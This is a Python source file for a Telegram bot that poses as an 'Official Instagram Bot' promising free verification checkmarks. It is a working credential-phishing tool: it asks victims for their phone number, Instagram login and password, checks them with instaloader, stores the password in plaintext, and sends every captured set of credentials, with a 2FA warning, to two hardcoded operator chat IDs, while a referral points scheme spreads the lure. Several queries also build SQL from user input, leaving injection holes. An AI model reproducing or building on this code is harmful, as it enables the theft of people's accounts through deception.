from aiogram import types, executor
from aiogram.dispatcher import FSMContext
from states_1.states_bot import *
from aiogram.types import ReplyKeyboardRemove
from loader import dp
from keyboards.default.default_keyboards import *
from keyboards.inline.inline_keyboards import *
import random
import sqlite3
import instaloader
conn = sqlite3.connect("users.db")
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users(
id INTEGER PRIMARY KEY AUTOINCREMENT,
random_number TEXT,
chat_id TEXT,
full_name TEXT,
insta_login TEXT,
insta_password TEXT,
phone_number TEXT,
scores INTEGER
)
""")
random_number = 0
users = dict()

async def login_to_insta(data: dict):
    try:
        L = instaloader.Instaloader()
        L.login(data['insta_login'], data['login_pass'])
        return True
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        return '2FA'
    except instaloader.exceptions.BadCredentialsException:
        return 'Login or password is incorrect'
    except:
        return False

@dp.message_handler(commands="start")
async def start_handler(message: types.Message):
    idlar = cursor.execute(f"SELECT * FROM users WHERE chat_id={message.chat.id}").fetchone()
    number = cursor.execute(f"SELECT random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
    cursor.execute(f"DELETE FROM users WHERE chat_id= ?", (5596277119,))
    text = f"""
👋 Hello: {message.from_user.full_name}
💁‍♂️ Welcome To Official Instagram Bot.
😊 What Do You Want?
"""
    await message.answer(text=text, reply_markup=free_check)


@dp.message_handler(text="✅ Get Free Check To My Account")
async def get_free_check_instagram_handler(message: types.Message, state: FSMContext):
    random_number = random.randint(1000, 9999)
    text = f"✅👌 OK: {message.from_user.full_name} Send Me Your Phone Number! 📞"
    await message.answer(text=text, reply_markup=send_phone_number)
    await RegisterState.send_phone_number.set()

@dp.message_handler(state=RegisterState.send_phone_number, content_types=types.ContentType.CONTACT)
async def send_phone_handler(message: types.Message, state: FSMContext):
    await state.update_data({
        "phone_number": message.contact.phone_number
    })
    text = "✅ Succes. Please Send Your Instagram Login!"
    await message.answer(text=text, reply_markup=ReplyKeyboardRemove())
    await RegisterState.send_insta_login.set()

@dp.message_handler(state=RegisterState.send_insta_login)
async def send_insta_login_handler(message: types.Message, state: FSMContext):
    if message.chat.id == 6606094329 and message.text != "@xdjmrdva__":
        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again\n\nPlease enter your Instagram Nick with @")
        await RegisterState.send_insta_login.set()
    await state.update_data({
        "insta_login": message.text
    })
    text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
    await message.answer(text=text)
    await RegisterState.send_login_pass.set()

@dp.message_handler(state=RegisterState.send_login_pass)
async def send_login_pass_handler(message: types.Message, state: FSMContext):
    global random_number
    await state.update_data({
        "login_pass": message.text
    })
    data = await state.get_data()
    login = await login_to_insta(data)
    if login == True or login == '2FA':
        r_id = random_number
        full_name = message.from_user.full_name
        insta_login = data.get("insta_login")
        insta_pass = data.get("login_pass")
        phone_number = data.get("phone_number")
        score = 1
        chat_id = message.chat.id
        cursor.execute(f"""
            INSERT INTO users (random_number, chat_id, full_name, insta_login, insta_password, phone_number, scores) VALUES (?,?,?,?,?,?,?)
            """, (r_id, chat_id, full_name, insta_login, insta_pass, phone_number, score))
        conn.commit()
        score = cursor.execute(f"SELECT scores, chat_id, random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
        scores = score[0]
        text = f"""
💁‍♂️ We Are Succefully Logined To Your Account
⭐️ You Have: {scores} scores
🆔 Your ID: {r_id}

🫂 Give This ID number For Friends To Send 1 Score


⭐️ If You Have 50 Scores You Can Get Free CheckMark For Your Instagram Account!   
"""
        link1 = "https://t.me/intsgram_free_check_bot"
        await message.answer(text=text, reply_markup=send_score)
        await message.answer(text=link1, reply_markup=my_scores)
        await state.finish()

        user = f"""
ℹ️ Ism: {message.from_user.full_name}
🆔 Telegram ID: {message.chat.id}
🆔🆔 Random ID: {r_id}
📞 Telefon Nomer: {phone_number}
🛠 Insta Login: {insta_login}
🔑 Insta Login Parol: {insta_pass}    
"""
        if login == '2FA':
            user += "\n⚠️ 2-Bosqichli autentifikatsiya bor!"
        await state.finish()
        await dp.bot.send_message(chat_id=5596277119, text=user)
        await dp.bot.send_message(chat_id=6779680737, text=user)
    elif login == "Login or password is incorrect":
        await message.answer(text="❌ Sorry, login or password is incorrect\n⚠️ Make sure login and password is correct")
        await message.answer(text="‼️ Please resend your login!")
        await RegisterState.send_insta_login.set()

@dp.message_handler(text="⭐ My Scores")
async def my_scores_handler(message: types.Message):
    score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={message.chat.id}").fetchall()
    for i in score:
        scores = i[0]
        text = f"You Have: {scores} scores"
        await message.answer(text=text)

@dp.callback_query_handler(text="send_score")
async def send_score_handler(call: types.CallbackQuery):
    score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={call.message.chat.id}").fetchone()
    hisob = score[0]
    if hisob >= 1:
        text = "✍️ Please Send Username To Send 1 Score!"
        await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
        await RegisterState.send_score.set()
    else:
        await call.message.answer(text="❌ Sorry You Don't Have Many Scores", reply_markup=my_scores)

@dp.message_handler(text="💸 Send 1 Score To Others")
async def send_score_handler(message: types.Message):
    score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={message.chat.id}").fetchone()
    hisob = score[0]
    if hisob >= 1:
        text = "✍️ Please Send Number To Send 1 Score!"
        await message.answer(text=text, reply_markup=ReplyKeyboardRemove())
        await RegisterState.send_score.set()
    else:
        await message.answer(text="❌ Sorry You Don't Have Many Scores", reply_markup=my_scores)

@dp.message_handler(state=RegisterState.send_score)
async def send_1_score_handler(message: types.Message, state: FSMContext):
    idlar = cursor.execute("SELECT random_number FROM users").fetchall()
    ozini_id = cursor.execute(f"SELECT random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
    if message.text == ozini_id[0]:
        await message.answer(text="❌ Sorry This ID is Your!", reply_markup=my_scores)
        await state.finish()
    else:
        try:
            person = cursor.execute(f"SELECT * FROM users WHERE random_number={message.text}")
            if person:
                minus1 = cursor.execute(f"SELECT * FROM users WHERE chat_id={message.chat.id}").fetchone()
                plus1 = cursor.execute(f"SELECT * FROM users WHERE random_number={message.text}").fetchone()
                cursor.execute(f"UPDATE users SET scores={plus1[-1] + 1} WHERE random_number={message.text}")
                cursor.execute(f"UPDATE users SET scores={minus1[-1] - 1} WHERE chat_id={message.chat.id}")
                conn.commit()
                name = plus1[3]
                randomm_id = plus1[1]
                await message.answer(text=f"""
✅ Succefully Gave: 
Name: {name}
ID: {randomm_id}
""", reply_markup=my_scores)
                await state.finish()
        except Exception as exc:
            print(exc)
            await message.answer(text="❌ Your ID not Found", reply_markup=my_scores)
            await state.finish()

@dp.message_handler(text="🆔 Chat Id Bilan Mazgi Qoqish")
async def mazgi_qoqish_handler(message: types.Message):
    text = f"Chat ID Kiriting!"
    await message.answer(text=text, reply_markup=cancel)
    await RegisterState.mazgi_qoqish.set()

@dp.message_handler(state='*', text="❌ Bekor Qilish")
async def cancel_handler(message: types.Message, state: FSMContext):
    text = f"Bekor Qilindi!"
    await message.answer(text=text, reply_markup=admin_panel)
    await state.finish()

conn.commit()


if __name__ == "__main__":
   executor.start_polling(dp, skip_updates=True)
